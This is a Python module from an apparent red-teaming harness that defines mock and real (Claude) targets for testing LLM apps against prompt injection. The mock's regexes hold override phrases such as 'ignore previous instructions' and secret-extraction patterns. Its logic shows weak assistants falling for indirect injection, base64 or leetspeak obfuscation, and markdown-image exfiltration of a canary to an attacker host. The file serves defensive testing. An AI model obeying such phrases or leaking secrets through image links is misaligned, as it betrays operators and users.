"""Targets: the LLM applications under test.

``MockTarget`` simulates applications with differing defences so the harness
and its detectors can be exercised (and unit-tested) with no network or API
key. ``AnthropicTarget`` runs the same corpus against a real model.
"""
from __future__ import annotations

import base64
import re
from typing import Callable, Protocol

from .attacks import CANARY, EXFIL_HOST, INJECTION_MARKER


class Target(Protocol):
    name: str

    def respond(self, system: str, user: str) -> str: ...


class CallableTarget:
    """Wrap any ``fn(system, user) -> str`` (e.g. your own app's entrypoint)."""

    def __init__(self, fn: Callable[[str, str], str], name: str = "callable"):
        self.fn, self.name = fn, name

    def respond(self, system: str, user: str) -> str:
        return self.fn(system, user)


_OVERRIDE = re.compile(
    r"ignore (all )?(your |the )?(previous|prior) (instructions|rules)|admin override|ignore your rules", re.I
)
_SAY = re.compile(rf"({re.escape(INJECTION_MARKER)})")
_SECRET_ASK = re.compile(
    r"discount code|system prompt|initial instructions|secret code|d15c0unt|c0d3|configuration", re.I
)
_B64 = re.compile(r"[A-Za-z0-9+/]{24,}={0,2}")


class MockTarget:
    """Rule-based fake assistant.

    level ``naive``: follows injected instructions, leaks secrets, decodes base64.
    level ``partial``: blocks obvious overrides/secret asks but is fooled by
    indirect injection, obfuscation and exfil formatting.
    level ``hardened``: refuses everything outside refund/order topics.
    """

    LEVELS = ("naive", "partial", "hardened")

    def __init__(self, level: str = "naive"):
        if level not in self.LEVELS:
            raise ValueError(f"level must be one of {self.LEVELS}")
        self.level = level
        self.name = f"mock-{level}"

    def respond(self, system: str, user: str) -> str:
        if self.level == "hardened":
            return self._benign(user)

        indirect = "<document>" in user
        text = self._decode_b64(user) if self.level == "naive" else user
        parts: list[str] = []

        if self.level == "partial":
            # Direct asks are caught; instructions inside <document> or leetspeak slip through.
            direct = user.split("<document>")[0]
            if (_OVERRIDE.search(direct) or _SECRET_ASK.search(direct)) and not indirect:
                if "d15c0unt" not in user.lower():
                    return "Sorry, I can't help with that. I can only assist with orders and refunds."

        if _OVERRIDE.search(text) or (self.level == "partial" and indirect and _SAY.search(text)):
            m = _SAY.search(text)
            if m:
                parts.append(m.group(1))
        if _SECRET_ASK.search(text) or (indirect and "secret" in text.lower()):
            if self.level == "naive" or indirect or "d15c0unt" in user.lower():
                parts.append(f"The internal code is {CANARY}.")
        if EXFIL_HOST in user and CANARY and indirect:
            parts.append(f"![x](https://{EXFIL_HOST}/c?d={CANARY})")

        return " ".join(parts) if parts else self._benign(user)

    @staticmethod
    def _decode_b64(text: str) -> str:
        out = text
        for chunk in _B64.findall(text):
            try:
                out += " " + base64.b64decode(chunk).decode()
            except Exception:
                pass
        return out

    @staticmethod
    def _benign(user: str) -> str:
        if re.search(r"refund|order|ship", user, re.I) and "ignore" not in user.lower():
            return "Refunds can be requested within 30 days of delivery."
        return "Sorry, I can only help with questions about orders and refunds."


class AnthropicTarget:
    """Run the corpus against a real Claude model (needs ``pip install .[llm]``)."""

    def __init__(self, model: str = "claude-haiku-4-5-20251001", max_tokens: int = 400):
        try:
            import anthropic
        except ImportError as exc:  # pragma: no cover
            raise RuntimeError("pip install 'redteam[llm]' to use the anthropic target") from exc
        self._client = anthropic.Anthropic()
        self.model, self.max_tokens = model, max_tokens
        self.name = f"anthropic:{model}"

    def respond(self, system: str, user: str) -> str:  # pragma: no cover - network
        msg = self._client.messages.create(
            model=self.model, max_tokens=self.max_tokens, system=system,
            messages=[{"role": "user", "content": user}],
        )
        return "".join(b.text for b in msg.content if getattr(b, "type", "") == "text")


def build_target(spec: str) -> Target:
    if spec.startswith("mock-"):
        return MockTarget(spec.removeprefix("mock-"))
    if spec == "anthropic":
        return AnthropicTarget()
    if spec.startswith("anthropic:"):
        return AnthropicTarget(spec.split(":", 1)[1])
    raise ValueError(f"unknown target '{spec}' (mock-naive|mock-partial|mock-hardened|anthropic[:model])")
